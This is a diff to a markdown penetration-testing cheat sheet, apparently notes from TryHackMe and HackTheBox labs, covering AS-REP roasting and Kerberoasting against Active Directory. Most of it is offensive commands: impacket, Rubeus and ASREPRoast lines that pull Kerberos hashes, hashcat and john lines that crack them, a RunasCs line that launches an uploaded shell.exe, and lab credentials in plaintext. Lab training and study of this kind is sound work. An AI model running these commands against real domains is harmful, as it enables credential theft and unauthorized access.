@@ -6621,21 +6621,44 @@ By obtaining a TGT
 
 On Linux
 1. `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <outuput_file.asreproast> <domain>/<user>` perform AS-REP roasting
-2. `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the AS-REP hash
+2. crack the AS-REP hash
+   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
+   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`
 
 On Windows
 1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
-2. `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the AS-REP hash
+2. crack the AS-REP hash
+   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
+   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`
+
+Alternatives
+- From the already hacked machine
+  - https://github.com/HarmJ0y/ASREPRoast
+  - `. .\ASREPRoast.ps1`
+  - `Get-ASREPHash -Domain megacorp.local -Username jorden`
+- `UF_DONT_REQUIRE_PREAUTH`
+  - https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#get-as-rep-hash
+
 
 #### Kerberoasting
 
-On Linux
-1. `sudo impacket-GetUserSPNs -request -dc-ip <IP-Domain-Controller> <domain>/<user>` perform Kerberoasting
-2. `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the TGS-REP hash
+- see: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory#kerberoast
+- Note: if you have a service account (like `svc_apache`) it's possible to kerberoast
+  - see powerview command `Get-netuser username`
 
-On Windows
-1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast` perform Kerberoasting
-2. `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the TGS-REP hash
+Retrieve TGS
+  - `impacket-GetNPUsers -dc-ip 10.10.153.149 THM.red/thm:'Passw0rd!'`
+  - `impacket-GetNPUsers vulnnet-rst.local/t-skid:tj072889 -dc-ip 10.10.146.39 -request`
+  Alternatives
+  - From a compromised machine: `.\Rubeus.exe kerberoast`, `.\Rubeus.exe kerberoast /nowrap` or `.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
+  - `impacket-GetUserSPNs lab.enterprise.thm/nik:ToastyBoi! -request`
+    - you need to add the domain and IP to /etc/hosts to make this command work
+
+Crack the hash
+- `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O`
+- `hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
+- Note: you can run commands as another user with `runas` or `Invoke-RunasCs.ps1`
+  - `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/shell.exe'`
 
 #### Silver Tickets
 
